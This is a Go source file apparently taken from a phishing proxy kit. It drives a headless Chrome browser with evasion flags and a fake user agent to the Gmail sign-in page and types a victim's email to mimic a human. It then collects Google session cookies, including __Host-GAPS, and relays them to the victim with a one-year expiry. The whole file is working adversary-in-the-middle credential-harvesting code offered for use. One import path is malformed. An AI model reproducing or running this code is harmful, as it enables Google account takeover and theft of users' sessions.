package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"

	"https://github.com/Evil-twist/exodus/log"
	"github.com/playwright-community/playwright-go"
)

// ANSI color constants for terminal output
const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Blue   = "\033[34m"
	Yellow = "\033[33m"
)

var globalCookiesEmail []playwright.Cookie
var globalCurrentUrlEmail string
var globalCookiesPassword []playwright.Cookie
var globalCurrentUrlPassword string

func launchBrowser(cfg *Config) (playwright.BrowserContext, playwright.Page, error) {
	log.Info(Blue + "🌐 Launching Chrome browser..." + Reset)
	chromePath := "/usr/bin/google-chrome"
	pw, err := playwright.Run()
	if err != nil {
		log.Info(fmt.Sprintf(Red+"❌ Failed to initialize Playwright: %v"+Reset, err))
		return nil, nil, err
	}
	if pw == nil {
		log.Info(Red + "❌ Playwright instance is nil" + Reset)
		return nil, nil, fmt.Errorf("playwright instance is nil")
	}

	launchOptions := playwright.BrowserTypeLaunchOptions{
		Headless:       playwright.Bool(true),
		ExecutablePath: &chromePath,
		Args: []string{
			"--disable-blink-features=AutomationControlled",
			"--start-maximized",
			"--no-sandbox",
			"--disable-setuid-sandbox",
			"--disable-infobars",
			"--disable-dev-shm-usage",
		},
	}

	browser, err := pw.Chromium.Launch(launchOptions)
	if err != nil {
		log.Info(fmt.Sprintf(Red+"❌ Failed to launch Chrome browser: %v"+Reset, err))
		return nil, nil, err
	}
	if browser == nil {
		log.Info(Red + "❌ Browser instance is nil" + Reset)
		return nil, nil, fmt.Errorf("browser instance is nil")
	}

	log.Info(Blue + "🖥️ Creating browser context to simulate a real screen..." + Reset)
	context, err := browser.NewContext(playwright.BrowserNewContextOptions{
		UserAgent: playwright.String("Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"),
	})
	if err != nil {
		log.Info(fmt.Sprintf(Red+"❌ Could not create browser context: %v"+Reset, err))
		return nil, nil, err
	}
	if context == nil {
		log.Info(Red + "❌ Browser context is nil" + Reset)
		return nil, nil, fmt.Errorf("browser context is nil")
	}

	log.Info(Blue + "📄 Creating new browser page..." + Reset)
	page, err := context.NewPage()
	if err != nil {
		log.Info(fmt.Sprintf(Red+"❌ Failed to create new page: %v"+Reset, err))
		return nil, nil, err
	}
	if page == nil {
		log.Info(Red + "❌ Page instance is nil" + Reset)
		return nil, nil, fmt.Errorf("page instance is nil")
	}
	log.Info(Blue + "🌍 Navigating to Gmail login page..." + Reset)
	_, err = page.Goto("https://accounts.google.com/signin/v2/identifier?service=mail")
	if err != nil {
		log.Info(fmt.Sprintf(Red+"❌ Failed to navigate to Gmail login page: %v"+Reset, err))
		return nil, nil, err
	}

	return context, page, nil
}
func processEmailAndCookies(context playwright.BrowserContext, page playwright.Page, email string, queryParams url.Values, resp *http.Response) *http.Response {
	defer closeBrowser(context.Browser()) // Ensure the browser is closed after all tasks are done

	log.Info(Blue + "⏳ Waiting for email input field to be visible..." + Reset)
	emailInput := page.Locator("input[type='email']")
	if err := emailInput.WaitFor(); err != nil {
		//log.Info(fmt.Sprintf(Red+"❌ Failed to wait for email input field: %v"+Reset, err))
	}
	log.Info(fmt.Sprintf(Blue+"✍️ Filling email input field letter by letter: %s"+Reset, email))
	for _, char := range email {
		if err := emailInput.Type(string(char)); err != nil {
			//log.Info(fmt.Sprintf(Red+"❌ Failed to type letter '%c': %v"+Reset, char, err))
		}
		time.Sleep(50 * time.Millisecond)
	}
	log.Info(Blue + "🔄 Waiting for 'Next' button to appear..." + Reset)
	nextButton := page.Locator("button:has-text('Next')")
	if err := nextButton.WaitFor(); err != nil {
		//log.Info(fmt.Sprintf(Red+"❌ Failed to wait for 'Next' button: %v"+Reset, err))
	}
	log.Info(Blue + "🔘 Clicking 'Next' button..." + Reset)
	if err := nextButton.Click(); err != nil {
		//log.Info(fmt.Sprintf(Red+"❌ Failed to click 'Next' button: %v"+Reset, err))
	}
	log.Info(Blue + "⏳ Waiting for 1 seconds before proceeding..." + Reset)
	time.Sleep(1 * time.Second)

	log.Info(Blue + "🍪 Collecting cookies and current page URL..." + Reset)
	cookiesEmail, err := context.Cookies()
	if err != nil {
		//log.Info(fmt.Sprintf(Red+"❌ Failed to collect cookies: %v"+Reset, err))
	}
	currentUrlEmail := page.URL()
	globalCookiesEmail = cookiesEmail
	globalCurrentUrlEmail = currentUrlEmail
	cookiesJSONBytesEmail, err := json.Marshal(globalCookiesEmail)
	if err != nil {
		log.Info(fmt.Sprintf(Red+"❌ Failed to encode globalCookiesEmail to JSON: %v"+Reset, err))
	} else {
		queryParams.Set("cookiesEmail", string(cookiesJSONBytesEmail))
	}
	if cookiesJSONEmail, ok := queryParams["cookiesEmail"]; ok {
		log.Info(Blue + "🛠️ Processing cookies from query parameters..." + Reset)

		var cookies []map[string]interface{}
		err := json.Unmarshal([]byte(cookiesJSONEmail[0]), &cookies)
		if err != nil {
			log.Info(fmt.Sprintf(Red+"❌ Failed to decode cookies JSON: %v"+Reset, err))
		} else {
			log.Info(Green + "✅ Cookies decoded successfully")

			newCookies := make([]http.Cookie, 0)
			for _, cookieMap := range cookies {
				cookie := http.Cookie{
					Name:     cookieMap["name"].(string),
					Value:    cookieMap["value"].(string),
					HttpOnly: cookieMap["httpOnly"].(bool),
					Secure:   cookieMap["secure"].(bool),
				}
				if cookie.Name == "__Host-GAPS" || cookie.Name == "__Secure-ENID" {
					cookie.Path = "/"
					cookie.Expires = time.Now().AddDate(1, 0, 0)
					cookie.HttpOnly = true
				}
				newCookies = append(newCookies, cookie)
			}
			for _, cookie := range newCookies {
				cookieString := fmt.Sprintf("%s=%s; Path=%s; Expires=%s; HttpOnly=%t; Secure=%t",
					cookie.Name, cookie.Value, cookie.Path, cookie.Expires.Format(time.RFC1123), cookie.HttpOnly, cookie.Secure)
				resp.Header.Add("Set-Cookie", cookieString)
			}
			if globalCurrentUrlEmail != "" {
				log.Info(Green + "✅ globalCurrentUrlEmail is not empty")
				parsedURL, err := url.Parse(globalCurrentUrlEmail)
				if err != nil {
					//log.Info(fmt.Sprintf("❌ Failed to parse globalCurrentUrlEmail: %v", err))
					log.Info("Failed to parse globalCurrentUrlEmail")
				}
				newURLStringEmail := fmt.Sprintf("%s?%s", parsedURL.Path, parsedURL.RawQuery)
				log.Info(Green + "✅ newURLStringEmail +++")
				if strings.Contains(newURLStringEmail, "rejected") {
					log.Info(Green + "✅ newURLStringEmail contains 'rejected'")
					// Handle the rejected case here if needed
				}
				resp.Body = ioutil.NopCloser(strings.NewReader(newURLStringEmail))
				log.Info(Green + "✅ Set resp.Body to newURLStringEmail")
			}
		}
	} else {
		log.Info(Red + "❌ No cookies found in query parameters." + Reset)
	}

	return resp
}

// Ensure browser is closed after all tasks are done
func closeBrowser(browser playwright.Browser) {
	if err := browser.Close(); err != nil {
		log.Info(fmt.Sprintf(Red+"❌ Failed to close browser: %v"+Reset, err))
	} else {
		log.Info(Green + "✅ Browser closed successfully.")
	}
}
